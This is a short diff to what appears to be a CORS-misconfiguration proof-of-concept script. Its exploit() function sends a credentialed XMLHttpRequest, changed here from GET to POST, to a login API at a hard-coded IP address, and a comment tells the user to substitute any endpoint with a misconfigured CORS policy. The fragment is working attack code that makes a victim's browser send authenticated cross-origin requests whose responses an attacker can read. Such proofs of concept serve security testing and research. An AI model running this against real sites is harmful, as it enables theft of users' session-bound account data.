@@ -50,9 +50,11 @@ function exploit() {
      
       }
  };
- xhttp.open("get", "http://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
+ xhttp.open("POST", "http://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
  //xhttp.setRequestHeader("Accept", "application/json, text/plain, */*");
  //xhttp.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
+
+
  xhttp.withCredentials = true;
  xhttp.send();
 }
